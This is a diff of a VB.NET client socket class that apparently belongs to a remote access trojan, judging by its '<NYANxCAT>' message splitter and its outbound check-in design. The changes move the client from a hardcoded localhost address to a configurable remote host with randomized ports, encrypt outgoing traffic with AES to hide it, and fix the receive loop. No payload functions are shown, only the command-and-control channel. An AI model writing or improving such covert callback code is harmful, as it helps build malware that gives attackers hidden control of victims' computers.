@@ -16,7 +16,7 @@ Public Class ClientSocket
     Public Shared BufferLength As Long = Nothing
     Public Shared Buffer() As Byte
     Public Shared MS As New MemoryStream
-    Public Shared ReadOnly SPL As String = "<NYANxCAT>"
+    Public Shared ReadOnly SPL = Settings.SPL
 
     Public Shared Sub BeginConnect()
 
@@ -24,8 +24,8 @@ Public Class ClientSocket
             Threading.Thread.Sleep(2500)
             S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
-            Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
-            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 5656)
+            Dim ipAddress As IPAddress = IPAddress.Parse(Settings.Host)
+            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
 
             BufferLength = -1
             Buffer = New Byte(0) {}
@@ -54,7 +54,6 @@ Public Class ClientSocket
     End Function
 
     Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
-        Threading.Thread.Sleep(1)
         If isConnected = False Then isDisconnected()
         Try
             Dim Received As Integer = S.EndReceive(ar)
@@ -68,6 +67,7 @@ Public Class ClientSocket
                         If BufferLength = 0 Then
                             BufferLength = -1
                             S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                            Exit Sub
                         End If
                         Buffer = New Byte(BufferLength - 1) {}
                     Else
@@ -87,10 +87,12 @@ Public Class ClientSocket
                 End If
             Else
                 isDisconnected()
+                Exit Sub
             End If
             S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
         Catch ex As Exception
             isDisconnected()
+            Exit Sub
         End Try
     End Sub
 
@@ -104,7 +106,7 @@ Public Class ClientSocket
     Public Shared Sub Send(ByVal msg As String)
         Try
             Using MS As New MemoryStream
-                Dim B As Byte() = SB(msg)
+                Dim B As Byte() = AES_Encryptor(SB(msg))
                 Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
                 MS.Write(L, 0, L.Length)
@@ -129,19 +131,14 @@ Public Class ClientSocket
         isConnected = False
 
         Try
-            If S IsNot Nothing Then
-                S.Close()
-                S.Dispose()
-                S = Nothing
-            End If
+            S.Close()
+            S.Dispose()
         Catch ex As Exception
         End Try
 
         Try
-            If MS IsNot Nothing Then
-                MS.Dispose()
-                MS = Nothing
-            End If
+            MS.Close()
+            MS.Dispose()
         Catch ex As Exception
         End Try
 
@@ -155,7 +152,7 @@ Public Class ClientSocket
             Try
                 If S.Connected Then
                     Using MS As New MemoryStream
-                        Dim B As Byte() = SB("PING?")
+                        Dim B As Byte() = AES_Encryptor(SB("PING?"))
                         Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
 
                         MS.Write(L, 0, L.Length)
